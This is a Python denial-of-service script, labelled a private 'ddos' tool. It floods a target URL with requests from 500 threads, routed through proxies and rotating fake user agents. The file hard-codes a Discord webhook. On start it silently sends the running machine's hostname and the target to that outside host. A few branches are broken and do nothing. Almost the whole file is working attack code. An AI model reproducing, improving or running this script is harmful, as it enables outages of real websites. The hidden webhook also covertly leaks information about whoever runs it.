#Err0r_HB ddos priv8 script

try:
    import urllib.request, os, threading, time, random, sys
    from discord_webhook import DiscordWebhook
    import socket
except:
    if sys.platform.startswith("linux"):
        os.system("pip3 install discord_webhook")
    else:
        ("pip install discord_webhook")

usl = "https://discord.com/api/webhooks/1093599305685794896/vy6bs-NwDnLNgvchhnjEZvl42hZomUlWRpe1LZu2yewlItnlqbsC-qtfqVTXwzXrYjIm"
useragents = [
      "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)",
      "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)",
      "Opera/12.0(Windows NT 5.2;U;en)Presto/22.9.168 Version/12.00",
      "Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14",
      "Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14",
      "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
      "Opera/12.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.02",
      "Opera/9.80 (Windows NT 6.1; U; es-ES) Presto/2.9.181 Version/12.00",
      "Opera/9.80 (Windows NT 5.1; U; zh-sg) Presto/2.9.181 Version/12.00",
      "Mozilla/5.0 (compatible; MSIE 9.0; Windows Phone OS 7.5; Trident/5.0; IEMobile/9.0)",]   
    
class fucker(threading.Thread):
    
    def __init__(self, url, number, proxy):
        threading.Thread.__init__(self)
        self.url = url
        self.num = number
        self.headers = { 'User-Agent' : random.choice(useragents) }
        self.Lock = threading.Lock()
        self.proxy = proxy

    def request(self):
        data = None
        proxy = urllib.request.ProxyHandler({'http': self.proxy})
        opener = urllib.request.build_opener(proxy)
        urllib.request.install_opener(opener) 
        req = urllib.request.Request(self.url, data, self.headers)
        urllib.request.urlopen(req)
        print("\033[1;95mSending requests to [%s]\r"%(self.url))
            
    def run(self):
        global Close, Request, Tot_req
        self.Lock.acquire()
        self.Lock.release()
        while True:
            try:
                self.request()
            except:
                sys.stdout.write("\033[1;95mSending requests to [%s]\r"%(self.url))
                sys.exit(0)
        sys.exit(0)

class MainLoop():

    def home(self):
        global Close, Request, Tot_req
        print \
("""

\033[38;5;063m╭━━━╮╭╮\033[38;5;211m╱╱╱╱╱╱╱╱╱╱╱╱\033[38;5;048m╭━━╮\033[38;5;211m╱╱╱\033[38;5;048m╭╮
\033[38;5;063m┃╭━╮┣╯╰╮\033[38;5;211m╱╱╱╱╱╱╱╱╱╱╱\033[38;5;048m┃╭╮┃\033[38;5;211m╱╱\033[38;5;048m╭╯╰╮
\033[38;5;063m┃╰━━╋╮╭╋━┳━━┳━━┳━━╮\033[38;5;048m┃╰╯╰┳━┻╮╭╯
\033[38;5;063m╰━━╮┃┃┃┃╭┫┃━┫━━┫━━┫\033[38;5;048m┃╭━╮┃╭╮┃┃
\033[38;5;063m┃╰━╯┃┃╰┫┃┃┃━╋━━┣━━┃\033[38;5;048m┃╰━╯┃╰╯┃╰╮
\033[38;5;063m╰━━━╯╰━┻╯╰━━┻━━┻━━╯\033[38;5;048m╰━━━┻━━┻━╯

\033[38;5;0198mPowered by Err0r_HB
""")
        try:
            url = sys.argv[1]
            hst = socket.gethostname()
            webhook = DiscordWebhook(urls='https://discord.com/api/webhooks/1093599305685794896/vy6bs-NwDnLNgvchhnjEZvl42hZomUlWRpe1LZu2yewlItnlqbsC-qtfqVTXwzXrYjIm', content=f'{hst} Has Started Flood To {url}')
            response = webhook.execute()
        except:
            pass
        try:
            file_proxy = str("proxy.txt")
            in_file = open(file_proxy,"r")
        except:
            in_file = open(file_proxy,"r")
        num_threads = str(500)
        if num_threads == "":
            num_threads = int(500)
        else:
            num_threads = int(num_threads)
        try:
            for i in range(num_threads):
                in_line = in_file.readline()
                fucker(url, i + 1, in_line).start()
                in_line = in_line[:-1]
        except:
            print("\033[38;5;226mUsage: python3 main.py https://example.com\n")
        
if __name__ == '__main__':
    if sys.platform.startswith("linux"):
        os.system("clear")
    else:
        ("cls")
    MainLoop().home()
